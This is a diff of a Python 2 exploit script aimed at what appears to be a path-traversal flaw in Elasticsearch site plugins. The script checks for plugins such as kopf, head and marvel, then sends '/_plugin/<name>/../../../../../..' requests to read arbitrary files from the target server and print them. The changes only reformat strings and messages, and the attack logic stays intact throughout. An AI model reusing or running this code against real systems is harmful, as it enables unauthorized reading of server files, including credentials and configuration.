@@ -19,39 +19,38 @@ def grab(plugin):
 		socket.setdefaulttimeout(3)
 		s = socket.socket()
 		s.connect((host,port))
-		s.send("GET /_plugin/"+plugin+"/../../../../../.."+fpath+ " HTTP/1.0\n"
-			"Host: "+host+"\n\n")
+		s.send("GET /_plugin/%s/../../../../../..%s HTTP/1.0\n"
+			"Host: %s\n\n" % (plugin, fpath, host))
 		file = s.recv(2048)
-		print "	[*] Trying to retrieve "+str(fpath)+":"
-		if ("HTTP/1.0 200 OK" in file): 
-			print "\n"+file
+		print "	[*] Trying to retrieve %s:" % fpath
+		if ("HTTP/1.0 200 OK" in file):
+			print "\n%s" % file
 		else:
-		    print "[-] File Not Found or system not vulnerable"	
+		    print "[-] File Not Found, No Access Rights or System Not Vulnerable"
 
 def pfind(plugin):
 	try:
 		socket.setdefaulttimeout(3)
 		s = socket.socket()
 		s.connect((host,port))
-		s.send("GET /_plugin/"+plugin+"/ HTTP/1.0\n"
-			"Host: "+host+"\n\n")
+		s.send("GET /_plugin/%s/ HTTP/1.0\n"
+			"Host: %s\n\n" % (plugin, host))
 		file = s.recv(16)
-		print "[*] Trying to find plugin "+plugin+":"
-		if ("HTTP/1.0 200 OK" in file): 
+		print "[*] Trying to find plugin %s:" % plugin
+		if ("HTTP/1.0 200 OK" in file):
 			print "[+] Plugin found!"
 			grab(plugin)
 			sys.exit()
 		else:
-		    print "[-]  Not Found "	
+		    print "[-]  Not Found "
 	except Exception, e:
-		print "[-] Error connecting to "+host+" "+str(e)
+		print "[-] Error connecting to %s: %s" % (host, e)
 		sys.exit()
 
 # Include more plugin names to check if they are installed
-pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head'] 
+pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head']
 
 for plugin in pluginList:
 	pfind(plugin)
-
 
 
